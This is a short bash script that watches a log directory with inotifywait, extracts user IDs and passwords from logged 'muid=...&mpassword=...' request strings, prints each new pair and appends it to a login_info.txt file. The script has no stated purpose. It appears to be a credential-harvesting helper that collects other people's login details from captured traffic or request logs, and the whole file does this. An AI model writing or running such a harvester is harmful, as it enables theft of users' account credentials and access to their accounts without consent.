#!/bin/bash


inotifywait -m  -e modify /root/test/logdir|
while  read dir action file ; 
do
	if [[ $(stat -c %s "/root/test/logdir/$file") -gt 1 ]];
	then
		id_passwd=$(sed -n '/mpassword=/p' /root/test/logdir/$file | sed 's/muid=\([A-Za-z0-9%]\+\)&mpassword=\([A-Za-z0-9%]\+\)&.*$/\1 \2/g' | tail -n1 )
		if  [[ ${#id_passwd} -gt 0   &&  $(grep -c "$id_passwd" /root/test/login_info.txt) -lt 1 ]];
		then			
			echo $id_passwd		
			echo $id_passwd >> /root/test/login_info.txt
		fi
	fi
		          
done
